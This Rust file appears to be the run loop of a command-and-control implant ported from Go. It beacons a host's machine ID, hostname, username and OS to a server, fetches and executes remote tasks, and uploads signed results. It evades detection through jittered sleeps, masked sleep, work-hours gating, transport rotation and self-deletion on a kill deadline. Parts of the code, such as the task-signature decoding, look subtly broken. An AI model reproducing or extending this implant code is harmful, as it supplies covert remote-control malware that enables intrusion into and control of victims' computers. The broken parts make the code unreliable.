//! The agent run loop.
//!
//! Port of `.run()`, `.checkin()`, `.pollAndRun()`, `.sleep()`,
//! `.rngIntn()`, `.shapeForOp()`, `.fetchTasks()`, `.postResult()`,
//! `.verifyTask()`.

use std::time::{Duration, Instant};

use p256::ecdsa::{
    signature::Verifier, Signature, VerifyingKey,
};
use rand::Rng;
use sha2::{Digest, Sha256};
use tokio::time::sleep as tokio_sleep;

use crate::evasion;
use crate::features::shaping::{ShapeSpec, ShapingSpec};
use crate::platform;
use crate::protocol::{
    Transport, TransportError, TaskResult, Task, CheckinResponse,
};

use super::agent::{Agent, AgentError};
use super::diag::{format_work_hours, inside_work_hours};
use super::helpers::encode_output;
use super::identity::sign_payload;

impl Agent {
    // -----------------------------------------------------------------
    // run
    // -----------------------------------------------------------------

    pub async fn run(&mut self) -> Result<(), AgentError> {
        // Initial 2–17s delay, matching `2 + rand.Intn(16)`.
        let initial = {
            let mut rng = self.rng.lock().expect("rng poisoned");
            rng.gen_range(2..18)
        };
        if super::diag::diag_enabled() {
            eprintln!(
                "[run] waiting {}s before first check-in",
                initial,
            );
        }
        tokio_sleep(Duration::from_secs(initial)).await;

        // Initial check-in with backoff. Doubles until 5 minutes.
        let mut backoff = Duration::from_secs(5);
        let mut attempt = 0u32;
        loop {
            attempt += 1;
            let transport_name =
                self.transport_names[self.transport_index];
            if super::diag::diag_enabled() {
                eprintln!(
                    "[run] check-in attempt #{} (transport={:?})",
                    attempt, transport_name,
                );
            }
            match self.checkin().await {
                Ok(()) => break,
                Err(e) => {
                    if super::diag::diag_enabled() {
                        eprintln!(
                            "[run] check-in #{} failed: {e} \
                             (retry in {:?})",
                            attempt, backoff,
                        );
                    }
                    tokio_sleep(backoff).await;
                    if backoff < Duration::from_secs(300) {
                        backoff *= 2;
                    }
                }
            }
        }

        if super::diag::diag_enabled() {
            let (start, end) = self.state.work_hours();
            eprintln!(
                "[run] work hours: {} (local {:02}:{:02})",
                format_work_hours(start, end),
                chrono::Local::now().format("%H:%M").to_string(),
                "",
            );
        }

        // Main loop.
        let mut loop_n = 0u64;
        loop {
            loop_n += 1;
            if super::diag::diag_enabled() {
                eprintln!("[run] loop iteration #{loop_n}");
            }

            if let Some(dl) = self.deadline {
                if Instant::now() > dl {
                    if super::diag::diag_enabled() {
                        eprintln!(
                            "[run] kill deadline passed — self-deleting"
                        );
                    }
                    let _ = platform::self_delete();
                    return Ok(());
                }
            }

            let (start, end) = self.state.work_hours();
            if !inside_work_hours(start, end) {
                // Sleep in 1s steps, checking deadline.
                for _ in 0..60 {
                    if let Some(dl) = self.deadline {
                        if Instant::now() > dl {
                            break;
                        }
                    }
                    tokio_sleep(Duration::from_secs(1)).await;
                }
                continue;
            }

            self.poll_and_run().await;
            self.sleep().await;
        }
    }

    // -----------------------------------------------------------------
    // checkin
    // -----------------------------------------------------------------

    async fn checkin(&mut self) -> Result<(), AgentError> {
        // Work hours from shared state, written into the identity
        // each check-in.
        let (start, end) = self.state.work_hours();
        self.identity.work_start = start as i32;
        self.identity.work_end = end as i32;

        // Build the pubkey PEM and identity signature if we have
        // a signing key.
        let (pubkey_pem, identity_sig, identity_ts) =
            if let Some(priv_key) = self.agent_priv.as_ref() {
                use base64::Engine as _;
                use p256::pkcs8::EncodePublicKey;
                let pem = priv_key
                    .verifying_key()
                    .to_public_key_pem(Default::default())
                    .unwrap_or_default();
                let ts = chrono::Utc::now().timestamp();
                let payload = format!(
                    "{}|{}|{}|{}|{}",
                    self.identity.machine_id,
                    self.identity.hostname,
                    self.identity.username,
                    self.identity.os,
                    ts,
                );
                match sign_payload(priv_key, payload.as_bytes()) {
                    Ok(sig) => (
                        pem,
                        base64::engine::general_purpose::STANDARD
                            .encode(&sig),
                        ts,
                    ),
                    Err(_) => (pem, String::new(), 0),
                }
            } else {
                (String::new(), String::new(), 0)
            };

        let t = self.transports[self.transport_index].as_ref();
        let reply = t
            .check_in(
                &self.identity,
                &pubkey_pem,
                &identity_sig,
                identity_ts,
                &self.wire,
            )
            .await;

        match reply {
            Ok(r) => {
                self.transport_failures = 0;
                self.session = r;
                if super::diag::diag_enabled() {
                    eprintln!(
                        "[checkin] SUCCESS — session id={} sleep={} \
                         jitter={:.2}",
                        self.session.id, self.session.sleep,
                        self.session.jitter,
                    );
                }
                Ok(())
            }
            Err(e) => {
                // 403 refusal → fatal
                if matches!(&e, TransportError::Status { got: 403, .. })
                    || e.to_string().contains("403")
                {
                    return Err(AgentError::Transport(e));
                }
                if self.cfg.transport_failover_after > 0
                    && is_transport_failure(&e.to_string())
                {
                    self.transport_failures += 1;
                    if self.transport_failures
                        >= self.cfg.transport_failover_after as u32
                    {
                        self.advance_transport();
                    }
                }
                Err(AgentError::Transport(e))
            }
        }
    }

    // -----------------------------------------------------------------
    // poll_and_run
    // -----------------------------------------------------------------

    async fn poll_and_run(&mut self) {
        let tasks = match self.fetch_tasks().await {
            Ok(t) => t,
            Err(e) => {
                if super::diag::diag_enabled() {
                    eprintln!("[poll] fetch failed: {e}");
                }
                if self.cfg.transport_failover_after > 0
                    && is_transport_failure(&e.to_string())
                {
                    self.transport_failures += 1;
                    if self.transport_failures
                        >= self.cfg.transport_failover_after as u32
                    {
                        self.advance_transport();
                    }
                }
                if should_recheck(&e) {
                    // 0–3000ms jitter
                    let jitter = {
                        let mut rng =
                            self.rng.lock().expect("rng poisoned");
                        rng.gen_range(0..3000u64)
                    };
                    tokio_sleep(Duration::from_millis(jitter)).await;
                    let _ = self.checkin().await;
                }
                return;
            }
        };

        for task in tasks {
            if task.id.is_empty() || task.verb.is_empty() {
                continue;
            }
            if !self.verify_task(&task) {
                if super::diag::diag_enabled() {
                    eprintln!(
                        "[task] signature verification failed — \
                         dropping task {} verb={}",
                        task.id, task.verb,
                    );
                }
                continue;
            }
            let result = self.execute(task.clone()).await;
            if let Err(e) = self.post_result(result).await {
                if super::diag::diag_enabled() {
                    eprintln!("[task] result upload failed: {e}");
                }
            }
        }
    }

    // -----------------------------------------------------------------
    // fetch_tasks
    // -----------------------------------------------------------------

    async fn fetch_tasks(&mut self) -> Result<Vec<Task>, TransportError> {
        let t = self.transports[self.transport_index].as_ref();
        let tasks = t.fetch_tasks(&self.wire).await?;
        self.transport_failures = 0;

        // Apply the schedule values the transport wrote to shared
        // state. `None` = "no update this poll."
        let sched = self.state.schedule();
        if let Some(s) = sched.sleep {
            self.session.sleep = s as i32;
        }
        if let Some(j) = sched.jitter {
            self.session.jitter = j;
        }
        if let Some(k) = sched.kill_deadline {
            self.deadline = Some(Instant::now() + secs_until(k));
        }
        self.spawn_to = sched.spawn_to;

        Ok(tasks)
    }

    // -----------------------------------------------------------------
    // post_result
    // -----------------------------------------------------------------

    async fn post_result(&mut self, mut r: TaskResult) -> Result<(), AgentError> {
        if let Some(priv_key) = self.agent_priv.as_ref() {
            let payload = r.signable().map_err(|e| {
                AgentError::Signature(e.to_string())
            })?;
            if let Ok(sig) = sign_payload(priv_key, &payload) {
                use base64::Engine as _;
                r.signature = base64::engine::general_purpose::STANDARD
                    .encode(&sig);
            }
        }
        let t = self.transports[self.transport_index].as_ref();
        t.post_result(r, &self.wire)
            .await
            .map_err(AgentError::Transport)
    }

    // -----------------------------------------------------------------
    // verify_task
    // -----------------------------------------------------------------

    fn verify_task(&self, task: &Task) -> bool {
        let Some(pub_key) = self.server_pub.as_ref() else {
            // No server public key — accept unsigned tasks.
            return true;
        };
        if task.signature.is_empty() {
            return false;
        }
        let sig = match base64::engine::general_purpose::STANDARD
            .decode(&task.signature)
            .and_then(|raw| {
                Signature::from_der(&raw)
                    .map_err(|e| base64::DecodeError::InvalidByte(0, 0).into())
                    .or_else(|_: base64::DecodeError| {
                        Signature::from_der(&task.signature.clone().into_bytes())
                            .map_err(|_| base64::DecodeError::InvalidLength(0))
                    })
            }) {
            Ok(s) => s,
            Err(_) => return false,
        };
        let body = match task.unsigned() {
            Ok(b) => b,
            Err(_) => return false,
        };
        let digest = Sha256::digest(&body);
        pub_key.verify_prehash(&digest, &sig).is_ok()
    }

    // -----------------------------------------------------------------
    // rng_intn
    // -----------------------------------------------------------------

    fn rng_intn(&self, n: u64) -> u64 {
        let mut rng = self.rng.lock().expect("rng poisoned");
        rng.gen_range(0..n.max(1))
    }

    // -----------------------------------------------------------------
    // sleep
    // -----------------------------------------------------------------

    async fn sleep(&self) {
        let base = self.session.sleep.max(0) as u64;
        if base == 0 {
            tokio_sleep(Duration::from_millis(100)).await;
            return;
        }
        let jitter = self.session.jitter.clamp(0.0, 1.0);
        let extra = {
            let mut rng = self.rng.lock().expect("rng poisoned");
            rng.gen::<f64>() * base as f64 * jitter
        };
        let total = Duration::from_secs_f64(base as f64 + extra);

        if self.cfg.sleep_mask && total > Duration::from_secs(5) {
            let ms = total.as_millis() as u32;
            if let Err(e) =
                evasion::masked_sleep(&self.cfg.sleep_mask_type, ms)
            {
                if super::diag::diag_enabled() {
                    eprintln!(
                        "[sleep] mask failed: {e} — refusing to \
                         sleep in plaintext"
                    );
                }
                let _ = platform::self_delete();
                std::process::exit(1);
            }
            return;
        }

        // Non-mask sleep: 30s steps, checking deadline.
        let deadline = Instant::now() + total;
        loop {
            let now = Instant::now();
            if now >= deadline {
                break;
            }
            if let Some(dl) = self.deadline {
                if now > dl {
                    break;
                }
            }
            let remaining = deadline - now;
            let step = if remaining < Duration::from_secs(30) {
                remaining
            } else {
                Duration::from_secs(30)
            };
            tokio_sleep(step).await;
        }
    }

    // -----------------------------------------------------------------
    // shape_for_op
    // -----------------------------------------------------------------

    pub fn shape_for_op(
        &self,
        op: &str,
        direction: &str,
    ) -> Option<&ShapeSpec> {
        let ShapingSpec {
            checkin_response,
            tasks_response,
            results_request,
        } = self.shaping.as_ref()?;
        match (op, direction) {
            ("beacon", "response") => checkin_response.as_ref(),
            ("tasks", "response") => tasks_response.as_ref(),
            ("results", "request") => results_request.as_ref(),
            _ => None,
        }
    }

    // -----------------------------------------------------------------
    // advance_transport
    // -----------------------------------------------------------------

    fn advance_transport(&mut self) {
        if self.transports.len() <= 1 {
            return;
        }
        let failures = self.transport_failures;
        self.transport_index =
            (self.transport_index + 1) % self.transports.len();
        self.transport_failures = 0;
        if super::diag::diag_enabled() {
            eprintln!(
                "[transport] failed {failures} consecutive times; \
                 rotating to {:?} (index {}/{})",
                self.transport_names[self.transport_index],
                self.transport_index,
                self.transports.len(),
            );
        }
    }
}

// =====================================================================
// Helpers
// =====================================================================

/// Heuristic transport-failure classifier. Matches the Go tree's
/// substring list.
fn is_transport_failure(msg: &str) -> bool {
    const MARKERS: &[&str] = &[
        "connection refused",
        "no such host",
        "i/o timeout",
        "certificate",
        "TLS handshake",
        "dial tcp",
        "dial udp",
        "EOF",
        "network is unreachable",
        "no route to host",
        "permission denied",
        "operation not permitted",
    ];
    MARKERS.iter().any(|m| msg.contains(m))
}

fn should_recheck(e: &TransportError) -> bool {
    if e.is_session_invalid() {
        return true;
    }
    let msg = e.to_string();
    const MARKERS: &[&str] = &[
        "status 500",
        "status 502",
        "status 503",
        "no session cookie",
        "connection refused",
        "no such host",
        "certificate",
        "invalid character",
        "i/o timeout",
    ];
    MARKERS.iter().any(|m| msg.contains(m))
}

fn secs_until(unix_secs: i64) -> Duration {
    let now = chrono::Utc::now().timestamp();
    let delta = (unix_secs - now).max(0) as u64;
    Duration::from_secs(delta)
}

// Silence an unused import in dispatch's use of encode_output.
#[allow(dead_code)]
fn _unused(_: VerifyingKey, _: &[u8]) -> String {
    encode_output(&[])
}